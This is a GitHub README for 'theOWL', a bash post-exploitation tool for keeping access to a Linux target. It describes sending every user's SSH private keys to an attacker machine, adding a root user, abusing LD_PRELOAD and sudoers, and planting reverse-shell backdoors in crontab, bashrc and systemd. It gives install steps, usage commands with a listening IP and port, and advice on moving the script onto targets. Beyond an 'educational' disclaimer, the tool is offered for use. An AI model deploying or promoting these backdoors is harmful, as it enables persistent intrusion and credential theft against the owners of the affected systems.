# The OWL [The One-Who-Laughs]

## Overview
The OWL is a bash script designed to help ensure continued access to a linux based target system by performing several actions that enhance access privileges and establish multiple backdoor mechanisms. This tool is intended for educational and research purposes only.

**Disclaimer:** Misuse of this script for illegal activities is prohibited. The author is not responsible for any consequences. Use at your own risk.

## Features
- **SSH Key Generation**: Generates SSH key pairs for all users and sends the private keys to a specified attack machine.
- **SSH Key Obfuscation**: Obfuscates private SSH keys to prevent others from using them.
- **User Creation**: Adds a new user with root privileges.
- **LD_PRELOAD & sudoers configuration**: setup LD_PRELOAD and configures 'find' in sudoers
- **Crontab Backdoor**: Adds crontab entries to establish reverse shells.
- **Bashrc Backdoor**: Edits bashrc files to spawn reverse shells on login.
- **History Tracking**: Keeps a history of actions performed.
- **Reversal of Changes**: Reverts all changes made by the script.


## Installion
1. Clone the repository (or use any other tool like wget):
    ```bash
    git clone https://github.com/sajitha-tj/theOWL.git
    cd theOWL
    ```
2. Make the script executable:
    ```bash
    chmod +x theOWL.sh
    ```
If your target system has no internet connection, you can download the code to your attacking system, host it using a web server (e.g., Python HTTP server), and download it to your target system from there.

## Usage
```sh
./theOWL.sh MODE LISTENING_IP LISTENING_PORT
```
theOWL requires sudo privileges to function properly. It uses userID to check if the current user is root.
You can use the '-P' flag at the end of the command to override this feature. This might be useful with a privileged user account other than root. Anyway, this is not recommended and may cause unexpected errors on the go.\

theOWL operates in two main modes: Auto-mode and Terminal-mode. See examples below for a bettter understanding.


### Terminal-mode
Terminal-mode allows you to selectively execute functions, providing more flexible persistent methods. You can set up different listening ports for different backdoors, ensuring continuous access to the system for a longer time. The following commands can be used in terminal-mode:

     Command       | Description
-------------------|-------------------------------------------
   ? / h /help     | display terminal-mode commands
  1 / ssh_key_gen  | generate ssh key pairs for all users
  so / ssh_obfus   | obfuscate ssh keys of all users
   2 / new_user    | add a new user as root
   3 / ld_pre      | setup LD_PRELOAD and 'find' in sudoers
   4 / crontab     | configure crontab 
   5 / bashrc      | edit bashrc files
   6 / systemd     | add a reverse shell as a systemd service
   9 / history     | display history (changes did)
   0 / reverse     | revert all changes back!
   bye / exit      | exit out of the OWL

### Auto-mode
Auto-mode is for quick setups. It does not allow customization of listening ports but uses the same port for every backdoor. It is useful when time is limited, ensuring multiple backdoor access methods within seconds. It goes through SSH key generation, obfuscating private SSH keys, adding a new user, setting up shells in crontab and bashrc, and adding a reverse shell as a systemd service. Note that not all functions available in terminal-mode are used here.
```sh
./theOWL.sh a 127.0.0.1 2323
```

## Examples

- Running in Terminal-mode
```sh
./theOWL.sh t 127.0.0.1 2323
```
- Running in Auto-mode
```sh
./theOWL.sh a 127.0.0.1 2323
```
- Running without privilege check
```sh
./theOWL.sh t 127.0.0.1 2323 -P
```

## Notes
- Ensure you have the necessary privileges to run the script, ideally as root.
- The script creates a temporary directory at `/tmp/.owl` for storing temporary files.
- Be cautious while using the script, especially in environments where unauthorized access could have severe consequences.
- **overide reverse function**: When using auto-mode, it will create a file .owl_hst_tmp in the current working directory to store the history. You can use this file later to revert changes made in auto-mode as follows:
```
sudo ./theOWL.sh --force-reverse .owl_hst_tmp
```

### Fun Fact
If you are ever wondering where the name comes from, "The One-Who-Laughs" is one of the many aliases used by the DC Comics villain, the [Batman Who Laughs](https://dc.fandom.com/wiki/Bruce_Wayne_(Earth_-22)). He was a dark and strategic character who always finds a way to stay one step ahead, embodying a sense of omnipresence and relentless control. Much like the Batman Who Laughs, theOWL script ensures continuous access to a target system through multiple backdoors, guaranteeing no single failure can prevent control.

## License
This project is licensed under the GPL-3.0 License - see the [LICENSE](https://github.com/sajitha-tj/theOWL/blob/main/LICENSE) file for details.

## Contributing
Feel free to fork this repository and submit pull requests for any improvements or additional features. xD
